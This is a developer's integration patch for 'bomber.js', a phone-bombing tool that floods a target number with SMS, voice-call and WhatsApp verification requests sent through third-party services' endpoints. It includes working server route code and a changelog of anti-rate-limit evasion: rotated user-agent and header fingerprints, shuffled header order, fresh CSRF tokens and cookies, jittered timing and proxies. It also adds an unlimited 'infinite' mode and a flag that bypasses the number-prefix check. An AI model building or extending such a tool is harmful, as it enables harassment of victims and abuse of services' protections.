# bomber.js integration patch for server.js

Three edits. Everything else in `server.js` stays.

## 1. Add the import (with the other imports at the top)

```js
import {runBomberJob, getJob, stopJob, snapshotJob} from './bomber.js';
```

## 2. Delete the inlined bomber (lines 79–253 of the old server.js)

Everything from `const KZ_MOBILE_PREFIXES=new Set([...` through
`snapshotBomberJob` goes. The `const failures=new Map()` line and
everything below stays.

## 3. Replace `handleBomberRoute` with:

```js
async function handleBomberRoute(req, res, pathname) {
  if (pathname === '/api/dispatch' && req.method === 'POST') {
    try {
      const b = await body(req);
      const infinite = b.infinite === true;
      const out = await runBomberJob(
        String(b.phone || '').trim(),
        infinite ? 0 : Number(b.count || 1),
        String(b.channel || 'both').toLowerCase(),
        b.simulation !== false,
        Array.isArray(b.proxies) ? b.proxies : null,
        {
          force: b.force === true,
          infinite,
          onLog: entry => console.warn(JSON.stringify(entry)),
        },
      );
      json(res, 200, out);
    } catch (e) {
      json(res, 400, { error: e.message || 'dispatch failed' });
    }
    return true;
  }
  const jobMatch = pathname.match(/^\/api\/job\/([a-z0-9]+)$/);
  if (jobMatch && req.method === 'GET') {
    const j = getJob(jobMatch[1]);
    if (!j) { json(res, 404, { error: 'not found' }); return true; }
    const url = new URL(req.url, 'http://localhost');
    const since = Number(url.searchParams.get('since') || 0);
    json(res, 200, snapshotJob(j, { since }));
    return true;
  }
  const stopMatch = pathname.match(/^\/api\/job\/([a-z0-9]+)\/stop$/);
  if (stopMatch && req.method === 'POST') {
    const ok = stopJob(stopMatch[1]);
    json(res, ok ? 200 : 404, { ok });
    return true;
  }
  return false;
}
```

## What's new vs the previous bomber

Anti-rate-limit:
- **Fresh UA + Accept-Language + Sec-CH-UA fingerprint per request.** Picked
  inside `fireEndpoint`, not reused across the dispatch cycle.
- **Fresh pre-request / CSRF / cookie every call** — already was per-call, but
  now explicitly documented.
- **UA pool widened** from 7 to ~25 strings — Chrome 150–154, Firefox 125–127,
  Safari 17.x, iOS 16/17, Android 13/14, mixed desktop/mobile.
- **Accept-Language rotation** (ru-KZ, ru-RU, kk-KZ, en-US with varied q).
- **Header-order shuffle** so two requests to the same endpoint don't send
  headers in the same order (defeats dumb order-based fingerprints).
- **Adaptive per-endpoint backoff.** 429/503/509 doubles that endpoint's
  cooldown (cap 5 min); honors `Retry-After`; decays after 5 clean hits.
- **Jittered dispatch interval** — ±25% around `60000/sms_per_minute`.
- **Weighted channel selection** — endpoints with higher `priority` fire more
  often. Default: voice > whatsapp > sms.

New dispatch params:
- `infinite: true` — ignore count, run until POST `/api/job/:id/stop`.
- `force: true` or `!` suffix on phone — bypass KZ prefix check.
- `channel: "whatsapp"` or `"wa"` — WhatsApp-only.

## endpoints.json schema additions (optional per endpoint)

```json
{
  "name": "...",
  "channel": "voice",       // voice | call | whatsapp | wa | sms
  "priority": 3,            // weight for selection (1 = default)
  ...
}
```

Top-level additions:
```json
{
  "accept_languages": ["ru-KZ,ru;q=0.9,kk;q=0.8,en;q=0.7", "..."]
}
```
